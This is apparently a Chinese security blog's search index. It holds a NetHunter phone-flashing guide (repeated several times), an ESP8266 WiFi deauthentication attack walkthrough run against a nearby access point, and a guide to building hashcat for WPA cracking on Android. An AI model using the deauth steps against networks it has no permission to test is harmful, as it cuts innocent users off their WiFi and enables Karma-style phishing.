HID攻击和MSF数据库等功能！内核的选择要根据自己手机的机型代号和安卓ROM版本和安卓版本进行选择(机型代号可以在终端模拟器内输入getprop ro.product.name查看)。下载的内核刷机包文件为kernel-nethunter-机型代号-安卓版本-日期.zip，根据自己的实际情况自行选择即可。 0.0.1.2 1.02 解锁Bootloader(已解锁的可跳过)首先要注意备份好数据，解锁Bootloader会清除手机内的所有数据！！！然后再进入手机设置\u003e关于手机\u003e连续点击5次左右版本号来开启开发者选项，然后返回设置\u003e找到开发者选项\u003e开启USB调试和OEM解锁。 接着重启手机至FASTBOOT模式并用数据线连接电脑，等待系统识别安装驱动。之后在FASTBOOT工具包目录内打开cmd窗口，并输入以下命令: fastboot devices 列出已连接到电脑的安卓设备，如果有显示手机的序列号则证明连接成功，如果没有显示请检查驱动是否已安装正确以及数据线是否完好。确认没问题后可以输入以下命令进行解锁: fastboot oem unlock PS:小米手机需要去官网申请解锁码后才能进行解锁操作 传送门 0.0.1.3 1.03 刷入TWRP将TWRP镜像复制到FASTBOOT工具包目录内，执行以下命令刷入TWRP: fastboot flash recovery twrp*.img 然后重启至TWRP: fastboot boot twrp*.img 0.0.1.4 1.04 刷机将NetHunter\"黑手OS包\"，内核包以及Magisk包复制进手机内置存储(如果是全新安装ROM的话需要把你要刷的ROM底包也复制进去)。进入到TWRP的主界面如图: 然后点击左上角的安装，选择要刷入的刷机包，然后右划确定即可(如果要重刷ROM底包的话需要先双清，点击右上角的清除右划确定即可)。过程如图: 之后重启手机，打开NetHunter主app等待初始化加载完成就ok了。 PS:在刷ROM底包之前需要双清，但是在刷NetHunter前后一定不要双清！一定不要双清！一定不要双清！重要的事情说三遍！！！NetHunter并非标准的安卓ROM包，所以刷机的时候不需要双清直接刷入即可。 ","date":"2019-02-21","objectID":"/2019/02/21/nethunter-install-guide.html/:0:0","series":null,"tags":["NetHunter","chroot"],"title":"NetHunter安装不完全指北","uri":"/2019/02/21/nethunter-install-guide.html/#101-前期准备"},{"categories":["kali"],"content":" 0x02 安装关于NetHunter的安装方法，大致可以分为刷机安装和免刷机安装两种办法。 0.0.1 1.刷机安装 0.0.1.1 1.01 前期准备需要设备: 安卓手机一部，一条数据线，一台电脑以及可靠的互联网连接 需要下载的内容: 1.你本机的ROM底包以及官方救砖线刷包(可选) 2.ADB和FASTBOOT命令行工具包 传送门 3.你本机的TWRP镜像 传送门 4 NetHunter的\"黑手OS\"包 传送门 5.NetHunter的内核包 传送门(官方支持设备需要刷入，否则没法使用外接无线网卡，HID BadUSB攻击和MSF数据库等功能。PS:内核包要自己手动生成，具体看README) 6.Magisk(功能强大的安卓Hook框架与root授权工具) 传送门 PS:这里的刷机包文件要根据你的手机CPU架构进行选择。64位ARM的CPU应该下载arm64专用的nethunter-generic-arm64-kalifs-full-rolling-xxx.zip,32位ARM的CPU应该下载armhf专用的nethunter-generic-armhf-kalifs-full-rolling-xxx.zip，某些采用x86/64 CPU的特殊型号的手机或平板电脑则应选择其专用的nethunter-generic-i386-kalifs-full-rolling-xxx.zip或nethunter-generic-amd64-kalifs-full-rolling-xxx.zip。这里一定要注意它们的区别，别下载错了，否则刷机时有可能会变砖！！！ 对于有官方内核支持的设备还应下载一个内核刷机包(官方内核支持设备列表点这里),否则将无法使用外接USB无线网卡、BadUSB HID攻击和MSF数据库等功能！内核的选择要根据自己手机的机型代号和安卓ROM版本和安卓版本进行选择(机型代号可以在终端模拟器内输入getprop ro.product.name查看)。下载的内核刷机包文件为kernel-nethunter-机型代号-安卓版本-日期.zip，根据自己的实际情况自行选择即可。 0.0.1.2 1.02 解锁Bootloader(已解锁的可跳过)首先要注意备份好数据，解锁Bootloader会清除手机内的所有数据！！！然后再进入手机设置\u003e关于手机\u003e连续点击5次左右版本号来开启开发者选项，然后返回设置\u003e找到开发者选项\u003e开启USB调试和OEM解锁。 接着重启手机至FASTBOOT模式并用数据线连接电脑，等待系统识别安装驱动。之后在FASTBOOT工具包目录内打开cmd窗口，并输入以下命令: fastboot devices 列出已连接到电脑的安卓设备，如果有显示手机的序列号则证明连接成功，如果没有显示请检查驱动是否已安装正确以及数据线是否完好。确认没问题后可以输入以下命令进行解锁: fastboot oem unlock PS:小米手机需要去官网申请解锁码后才能进行解锁操作 传送门 0.0.1.3 1.03 刷入TWRP将TWRP镜像复制到FASTBOOT工具包目录内，执行以下命令刷入TWRP: fastboot flash recovery twrp*.img 然后重启至TWRP: fastboot boot twrp*.img 0.0.1.4 1.04 刷机将NetHunter\"黑手OS包\"，内核包以及Magisk包复制进手机内置存储(如果是全新安装ROM的话需要把你要刷的ROM底包也复制进去)。进入到TWRP的主界面如图: 然后点击左上角的安装，选择要刷入的刷机包，然后右划确定即可(如果要重刷ROM底包的话需要先双清，点击右上角的清除右划确定即可)。过程如图: 之后重启手机，打开NetHunter主app等待初始化加载完成就ok了。 PS:在刷ROM底包之前需要双清，但是在刷NetHunter前后一定不要双清！一定不要双清！一定不要双清！重要的事情说三遍！！！NetHunter并非标准的安卓ROM包，所以刷机的时候不需要双清直接刷入即可。 ","date":"2019-02-21","objectID":"/2019/02/21/nethunter-install-guide.html/:0:0","series":null,"tags":["NetHunter","chroot"],"title":"NetHunter安装不完全指北","uri":"/2019/02/21/nethunter-install-guide.html/#102-解锁bootloader已解锁的可跳过"},{"categories":["kali"],"content":" 0x02 安装关于NetHunter的安装方法，大致可以分为刷机安装和免刷机安装两种办法。 0.0.1 1.刷机安装 0.0.1.1 1.01 前期准备需要设备: 安卓手机一部，一条数据线，一台电脑以及可靠的互联网连接 需要下载的内容: 1.你本机的ROM底包以及官方救砖线刷包(可选) 2.ADB和FASTBOOT命令行工具包 传送门 3.你本机的TWRP镜像 传送门 4 NetHunter的\"黑手OS\"包 传送门 5.NetHunter的内核包 传送门(官方支持设备需要刷入，否则没法使用外接无线网卡，HID BadUSB攻击和MSF数据库等功能。PS:内核包要自己手动生成，具体看README) 6.Magisk(功能强大的安卓Hook框架与root授权工具) 传送门 PS:这里的刷机包文件要根据你的手机CPU架构进行选择。64位ARM的CPU应该下载arm64专用的nethunter-generic-arm64-kalifs-full-rolling-xxx.zip,32位ARM的CPU应该下载armhf专用的nethunter-generic-armhf-kalifs-full-rolling-xxx.zip，某些采用x86/64 CPU的特殊型号的手机或平板电脑则应选择其专用的nethunter-generic-i386-kalifs-full-rolling-xxx.zip或nethunter-generic-amd64-kalifs-full-rolling-xxx.zip。这里一定要注意它们的区别，别下载错了，否则刷机时有可能会变砖！！！ 对于有官方内核支持的设备还应下载一个内核刷机包(官方内核支持设备列表点这里),否则将无法使用外接USB无线网卡、BadUSB HID攻击和MSF数据库等功能！内核的选择要根据自己手机的机型代号和安卓ROM版本和安卓版本进行选择(机型代号可以在终端模拟器内输入getprop ro.product.name查看)。下载的内核刷机包文件为kernel-nethunter-机型代号-安卓版本-日期.zip，根据自己的实际情况自行选择即可。 0.0.1.2 1.02 解锁Bootloader(已解锁的可跳过)首先要注意备份好数据，解锁Bootloader会清除手机内的所有数据！！！然后再进入手机设置\u003e关于手机\u003e连续点击5次左右版本号来开启开发者选项，然后返回设置\u003e找到开发者选项\u003e开启USB调试和OEM解锁。 接着重启手机至FASTBOOT模式并用数据线连接电脑，等待系统识别安装驱动。之后在FASTBOOT工具包目录内打开cmd窗口，并输入以下命令: fastboot devices 列出已连接到电脑的安卓设备，如果有显示手机的序列号则证明连接成功，如果没有显示请检查驱动是否已安装正确以及数据线是否完好。确认没问题后可以输入以下命令进行解锁: fastboot oem unlock PS:小米手机需要去官网申请解锁码后才能进行解锁操作 传送门 0.0.1.3 1.03 刷入TWRP将TWRP镜像复制到FASTBOOT工具包目录内，执行以下命令刷入TWRP: fastboot flash recovery twrp*.img 然后重启至TWRP: fastboot boot twrp*.img 0.0.1.4 1.04 刷机将NetHunter\"黑手OS包\"，内核包以及Magisk包复制进手机内置存储(如果是全新安装ROM的话需要把你要刷的ROM底包也复制进去)。进入到TWRP的主界面如图: 然后点击左上角的安装，选择要刷入的刷机包，然后右划确定即可(如果要重刷ROM底包的话需要先双清，点击右上角的清除右划确定即可)。过程如图: 之后重启手机，打开NetHunter主app等待初始化加载完成就ok了。 PS:在刷ROM底包之前需要双清，但是在刷NetHunter前后一定不要双清！一定不要双清！一定不要双清！重要的事情说三遍！！！NetHunter并非标准的安卓ROM包，所以刷机的时候不需要双清直接刷入即可。 ","date":"2019-02-21","objectID":"/2019/02/21/nethunter-install-guide.html/:0:0","series":null,"tags":["NetHunter","chroot"],"title":"NetHunter安装不完全指北","uri":"/2019/02/21/nethunter-install-guide.html/#103-刷入twrp"},{"categories":["kali"],"content":" 0x02 安装关于NetHunter的安装方法，大致可以分为刷机安装和免刷机安装两种办法。 0.0.1 1.刷机安装 0.0.1.1 1.01 前期准备需要设备: 安卓手机一部，一条数据线，一台电脑以及可靠的互联网连接 需要下载的内容: 1.你本机的ROM底包以及官方救砖线刷包(可选) 2.ADB和FASTBOOT命令行工具包 传送门 3.你本机的TWRP镜像 传送门 4 NetHunter的\"黑手OS\"包 传送门 5.NetHunter的内核包 传送门(官方支持设备需要刷入，否则没法使用外接无线网卡，HID BadUSB攻击和MSF数据库等功能。PS:内核包要自己手动生成，具体看README) 6.Magisk(功能强大的安卓Hook框架与root授权工具) 传送门 PS:这里的刷机包文件要根据你的手机CPU架构进行选择。64位ARM的CPU应该下载arm64专用的nethunter-generic-arm64-kalifs-full-rolling-xxx.zip,32位ARM的CPU应该下载armhf专用的nethunter-generic-armhf-kalifs-full-rolling-xxx.zip，某些采用x86/64 CPU的特殊型号的手机或平板电脑则应选择其专用的nethunter-generic-i386-kalifs-full-rolling-xxx.zip或nethunter-generic-amd64-kalifs-full-rolling-xxx.zip。这里一定要注意它们的区别，别下载错了，否则刷机时有可能会变砖！！！ 对于有官方内核支持的设备还应下载一个内核刷机包(官方内核支持设备列表点这里),否则将无法使用外接USB无线网卡、BadUSB HID攻击和MSF数据库等功能！内核的选择要根据自己手机的机型代号和安卓ROM版本和安卓版本进行选择(机型代号可以在终端模拟器内输入getprop ro.product.name查看)。下载的内核刷机包文件为kernel-nethunter-机型代号-安卓版本-日期.zip，根据自己的实际情况自行选择即可。 0.0.1.2 1.02 解锁Bootloader(已解锁的可跳过)首先要注意备份好数据，解锁Bootloader会清除手机内的所有数据！！！然后再进入手机设置\u003e关于手机\u003e连续点击5次左右版本号来开启开发者选项，然后返回设置\u003e找到开发者选项\u003e开启USB调试和OEM解锁。 接着重启手机至FASTBOOT模式并用数据线连接电脑，等待系统识别安装驱动。之后在FASTBOOT工具包目录内打开cmd窗口，并输入以下命令: fastboot devices 列出已连接到电脑的安卓设备，如果有显示手机的序列号则证明连接成功，如果没有显示请检查驱动是否已安装正确以及数据线是否完好。确认没问题后可以输入以下命令进行解锁: fastboot oem unlock PS:小米手机需要去官网申请解锁码后才能进行解锁操作 传送门 0.0.1.3 1.03 刷入TWRP将TWRP镜像复制到FASTBOOT工具包目录内，执行以下命令刷入TWRP: fastboot flash recovery twrp*.img 然后重启至TWRP: fastboot boot twrp*.img 0.0.1.4 1.04 刷机将NetHunter\"黑手OS包\"，内核包以及Magisk包复制进手机内置存储(如果是全新安装ROM的话需要把你要刷的ROM底包也复制进去)。进入到TWRP的主界面如图: 然后点击左上角的安装，选择要刷入的刷机包，然后右划确定即可(如果要重刷ROM底包的话需要先双清，点击右上角的清除右划确定即可)。过程如图: 之后重启手机，打开NetHunter主app等待初始化加载完成就ok了。 PS:在刷ROM底包之前需要双清，但是在刷NetHunter前后一定不要双清！一定不要双清！一定不要双清！重要的事情说三遍！！！NetHunter并非标准的安卓ROM包，所以刷机的时候不需要双清直接刷入即可。 ","date":"2019-02-21","objectID":"/2019/02/21/nethunter-install-guide.html/:0:0","series":null,"tags":["NetHunter","chroot"],"title":"NetHunter安装不完全指北","uri":"/2019/02/21/nethunter-install-guide.html/#104-刷机"},{"categories":["wireless-hacking"],"content":" 0x00 前言前段时间玩过一阵子ESP8266 WiFi Deauth攻击，闲的无聊来水一波文章！ ","date":"2018-12-06","objectID":"/2018/12/06/wifi-deauth-attack.html/:0:0","series":null,"tags":["esp8266","wifi","wireless"],"title":"wifi-deauth-attack初探","uri":"/2018/12/06/wifi-deauth-attack.html/#0x00-前言"},{"categories":["wireless-hacking"],"content":" 0x01 背景我们所使用的802.11 WiFi协议包含了一个Deauthentication(解除身份验证)的特性，其作用是为了将用户从无线网络中分离。而黑客们正是利用了WiFi的这个特性，使得黑客可以随时使用无线AP的伪造源地址，向无线AP设备发送一个或多个Deauthentication攻击数据包，从而使得合法客户端设备从无线AP设备上掉线。简单来说就是黑客可以随时让你的无线终端设备(例如智能手机，平板，笔记本)等设备从WiFi中掉线然后再也无法连接，除非黑客停止攻击。 该协议不需要对Deauthentication攻击框架进行加密，甚至是建立会话。该问题在802.11w-2009中有提及解决，但是几乎所有的无线AP设备厂商默认都禁用了这个属性，所以直到今天这个漏洞仍影响着全球近九成以上的无线AP设备。 ","date":"2018-12-06","objectID":"/2018/12/06/wifi-deauth-attack.html/:0:0","series":null,"tags":["esp8266","wifi","wireless"],"title":"wifi-deauth-attack初探","uri":"/2018/12/06/wifi-deauth-attack.html/#0x01-背景"},{"categories":["wireless-hacking"],"content":" 0x02 材料准备 ·ESP8266 无线模块一块 (某宝自行搜索) ·一条Micro USB数据线 (有条件的话用USB转TTL也行) ·电脑一台 ","date":"2018-12-06","objectID":"/2018/12/06/wifi-deauth-attack.html/:0:0","series":null,"tags":["esp8266","wifi","wireless"],"title":"wifi-deauth-attack初探","uri":"/2018/12/06/wifi-deauth-attack.html/#0x02-材料准备"},{"categories":["wireless-hacking"],"content":" 0x03 环境准备 ·Arduino IDE 传送门 ·NodeMcu Flasher 传送门 ","date":"2018-12-06","objectID":"/2018/12/06/wifi-deauth-attack.html/:0:0","series":null,"tags":["esp8266","wifi","wireless"],"title":"wifi-deauth-attack初探","uri":"/2018/12/06/wifi-deauth-attack.html/#0x03-环境准备"},{"categories":["wireless-hacking"],"content":" 0x03 刷入固件首先把我们的ESP8266连接到电脑上，安装对应的驱动 ·CH340串口驱动 传送门 ·CP2102串口驱动 传送门 接着我们去下载ESP8266专用的WiFi Deauth攻击固件，固件地址: https://github.com/spacehuhn/esp8266_deauther/releases 这里需要注意的是固件的选择要根据你的模块Flash大小来选择，ESP-12的Flash大小为4MB，ESP-07的为1MB,ESP-01的为512KB/1MB。详细说明可以参考官方wiki 接下来我们开始刷入固件，打开NodeMcu Flasher，点击Config选项卡，选择你的固件，接着点击Advanced选项卡，在Baudrate(波特率)处选择115200，Flash size根据你的板子Flash大小来选择，我这里是ESP-12所以选择4MB，Flash speed选择80MHz，SPI mode选择DIO,最后我们点击Operation选项卡，在COM port处选择你的板子的端口，可以在windows的设备管理那里看到，然后点击Flash(F)按钮，接着就是等待固件烧录完成了。固件烧录完成后NodeMcu Flasher左下角的NODEMCU TEAM图标会变为绿色。 ","date":"2018-12-06","objectID":"/2018/12/06/wifi-deauth-attack.html/:0:0","series":null,"tags":["esp8266","wifi","wireless"],"title":"wifi-deauth-attack初探","uri":"/2018/12/06/wifi-deauth-attack.html/#0x03-刷入固件"},{"categories":["wireless-hacking"],"content":" 0x04 攻击实战接着我们打开手机WiFi设置，能搜索到一个SSID名为pwned的WiFi，这个就是我们烧录好固件之后生成的，密码为deauther，连接上去。接着我们打开手机浏览器，在地址栏输入http://192.168.4.1进入deauther的后台管理界面，如图: 由于最新v2.1.0版的固件自带了一个开机自动扫描AP的脚本，所以就不需要我们连上后再手动扫描了，当然如果你想得到更准确的结果的话你也可以重新扫描。扫描周围的无线热点后，我们选择一个目标开始攻击，这里我选择的FAST_4E14这个热点，然后选择攻击界面，如图: 选择Deauth攻击，接着刷新界面就能看到攻击效果了 此时被攻击的无线AP上所有已连接的设备会全部掉线直至我们停止攻击。 ","date":"2018-12-06","objectID":"/2018/12/06/wifi-deauth-attack.html/:0:0","series":null,"tags":["esp8266","wifi","wireless"],"title":"wifi-deauth-attack初探","uri":"/2018/12/06/wifi-deauth-attack.html/#0x04-攻击实战"},{"categories":["wireless-hacking"],"content":" 0x05 安全建议由于WiFi Deauth攻击是802.11协议上的一个缺陷造成的，所以目前并没有什么有效的防御措施，只能等无线联盟更新协议来弥补这个缺憾。个人的话尽量按照以下几点来做吧 ·路由设置白名单或MAC地址绑定 ·开启访客WiFi ·隐藏SSID ·不用WiFi时尽量关闭路由 ","date":"2018-12-06","objectID":"/2018/12/06/wifi-deauth-attack.html/:0:0","series":null,"tags":["esp8266","wifi","wireless"],"title":"wifi-deauth-attack初探","uri":"/2018/12/06/wifi-deauth-attack.html/#0x05-安全建议"},{"categories":["wireless-hacking"],"content":" 0x06 补充说明可能大家对ESP8266 Deauther的最后一个攻击模式不太清楚，这里引用天马安全团队杨大佬的文章来解释一下:我们所使用的无线客户端设备在连接无线AP时会采用两种扫描方法，主动扫描和被动扫描。在主动扫描中，客户端发送Probe Request,接收由AP发回的Probe Response。在被动扫描中，客户端在每个频道监听AP周期性发送的Beacon无线数据帧。之后是认证(Authentication)和连接(Association)过程。 说白了就是我们所使用的无线客户端(例如手机，平板，笔记本等设备)在连接WiFi的时候也会向外广播一个无线数据帧，这个无线数据帧就是Probe Request帧,这个数据帧里面包含了我们的无线设备曾经连过哪些WiFi，它们的SSID是什么，MAC地址等等，而无线AP接收到这个数据帧之后也会进行回复响应，回复给无线客户端设备另外一个数据帧-Probe Response帧，这样就可以做到无线客户端设备和无线AP设备之间的快速连接。 但是这个特性也可以被黑客给利用，黑客可以监听空气中的无线数据包，分析里面的内容，可以抓到这个Probe Request帧，得到里面包含的无线客户端设备曾经连过的WiFi热点的SSID,MAC地址，从而伪造一个同名同MAC地址的无线接入点来实施钓鱼攻击。这就是后来的Karma和Mana攻击的原理！具体的内容可以看看FreeBuf上的相关文章，我这个菜鸡就不在这里班门弄斧了！ 聊聊WiFi Hacks：为何你的Karma攻击不好使了 WiFi Pineapple的Karma攻击与原理探究 WiFi Pineapple的Karma攻击与原理探究 主动触发被动模式从而挟持无线客户端 – Passive Karma Attack ","date":"2018-12-06","objectID":"/2018/12/06/wifi-deauth-attack.html/:0:0","series":null,"tags":["esp8266","wifi","wireless"],"title":"wifi-deauth-attack初探","uri":"/2018/12/06/wifi-deauth-attack.html/#0x06-补充说明"},{"categories":["kali"],"content":" 0x00 环境要求·已安装Chroot Linux的安卓手机一部 ·可靠的的互联网连接 ","date":"2018-12-05","objectID":"/2018/12/05/android-chroot-hashcat.html/:0:0","series":null,"tags":["deploy","chroot"],"title":"安卓Chroot环境使用Hashcat","uri":"/2018/12/05/android-chroot-hashcat.html/#0x00-环境要求"},{"categories":["kali"],"content":" 0x01 更新软件源并安装相关依赖 apt update \u0026\u0026 apt install git boinc-client-opencl opencl-headers firmware-qcom-media u-boot-qcom qbzr qcomicbook clinfo ","date":"2018-12-05","objectID":"/2018/12/05/android-chroot-hashcat.html/:0:0","series":null,"tags":["deploy","chroot"],"title":"安卓Chroot环境使用Hashcat","uri":"/2018/12/05/android-chroot-hashcat.html/#0x01-更新软件源并安装相关依赖"},{"categories":["kali"],"content":" 0x02 下载源码仓库 git clone https://github.com/hashcat/hashcat.git ","date":"2018-12-05","objectID":"/2018/12/05/android-chroot-hashcat.html/:0:0","series":null,"tags":["deploy","chroot"],"title":"安卓Chroot环境使用Hashcat","uri":"/2018/12/05/android-chroot-hashcat.html/#0x02-下载源码仓库"},{"categories":["kali"],"content":" 0x03 切换进源码目录并注册OpenCL Headers cd hashcat \u0026\u0026 git submodule update --init ","date":"2018-12-05","objectID":"/2018/12/05/android-chroot-hashcat.html/:0:0","series":null,"tags":["deploy","chroot"],"title":"安卓Chroot环境使用Hashcat","uri":"/2018/12/05/android-chroot-hashcat.html/#0x03-切换进源码目录并注册opencl-headers"},{"categories":["kali"],"content":" 0x04 编译安装 make \u0026\u0026 make install ","date":"2018-12-05","objectID":"/2018/12/05/android-chroot-hashcat.html/:0:0","series":null,"tags":["deploy","chroot"],"title":"安卓Chroot环境使用Hashcat","uri":"/2018/12/05/android-chroot-hashcat.html/#0x04-编译安装"},{"categories":["kali"],"content":" 0x05 运行测试 hashcat -I \u0026\u0026 hashcat -m 2500 -b 感谢群友***@至尊天下*** 提供技术支持！ ","date":"2018-12-05","objectID":"/2018/12/05/android-chroot-hashcat.html/:0:0","series":null,"tags":["deploy","chroot"],"title":"安卓Chroot环境使用Hashcat","uri":"/2018/12/05/android-chroot-hashcat.html/#0x05-运行测试"},{"categories":null,"content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. ","date":"2018-12-04","objectID":"/2018/12/04/hello-world.html/:0:0","series":null,"tags":null,"title":"Hello World","uri":"/2018/12/04/hello-world.html/#"},{"categories":null,"content":" 1 Quick Start","date":"2018-12-04","objectID":"/2018/12/04/hello-world.html/:1:0","series":null,"tags":null,"title":"Hello World","uri":"/2018/12/04/hello-world.html/#quick-start"},{"categories":null,"content":" 1.1 Create a new post $ hexo new \"My New Post\" More info: Writing ","date":"2018-12-04","objectID":"/2018/12/04/hello-world.html/:1:1","series":null,"tags":null,"title":"Hello World","uri":"/2018/12/04/hello-world.html/#create-a-new-post"},{"categories":null,"content":" 1.2 Run server $ hexo server More info: Server ","date":"2018-12-04","objectID":"/2018/12/04/hello-world.html/:1:2","series":null,"tags":null,"title":"Hello World","uri":"/2018/12/04/hello-world.html/#run-server"},{"categories":null,"content":" 1.3 Generate static files $ hexo generate More info: Generating ","date":"2018-12-04","objectID":"/2018/12/04/hello-world.html/:1:3","series":null,"tags":null,"title":"Hello World","uri":"/2018/12/04/hello-world.html/#generate-static-files"},{"categories":null,"content":" 1.4 Deploy to remote sites $ hexo deploy More info: Deployment ","date":"2018-12-04","objectID":"/2018/12/04/hello-world.html/:1:4","series":null,"tags":null,"title":"Hello World","uri":"/2018/12/04/hello-world.html/#deploy-to-remote-sites"}]